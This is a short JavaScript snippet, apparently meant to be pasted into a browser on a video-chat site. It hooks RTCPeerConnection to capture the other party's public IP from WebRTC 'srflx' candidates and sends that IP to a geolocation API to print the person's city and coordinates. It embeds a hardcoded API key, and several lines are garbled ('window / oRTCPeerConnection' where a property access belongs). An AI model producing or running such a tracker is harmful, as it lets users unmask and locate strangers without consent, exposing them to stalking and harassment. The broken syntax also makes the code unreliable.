const apikey = "935f589fea5c480e82f1ee8d86a8be24";

window.oRTCPeerConnection = window / oRTCPeerConnection || window.RTCPeerConnection;
window.RTCPeerConnection = function (...args) {
    const pc = new window / oRTCPeerConnection(...args);
    pc.oaddIceCandidate = pc.addIceCandidate;
    pc.addIceCandidate = function (iceCandidate, ...rest) {
        const fields = iceCandidate.candidate.split(" ");
        const ip = fields[4];
        if (fields[7] === "srflx") {
            getLocation(ip);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest);

    };
    return pc;
};

const getLocation=async(ip)=>{
    let url=`https://api.ipgeolocation.io/ipgeo?apiKey=${apikey}&ip=${ip}`;
    await fetch(url).then((Response)=>{
        Response.json().then((json)=>{
            const output =`
            ------------------
            Country:${json.country_name}
            sate:${json.sate_prov}
            City:${json.city}
            district:${json.district}
            lat/long:(${json.latitude},${json.longitude})
            ------------------`;
            console.log(output);
        })
    })
}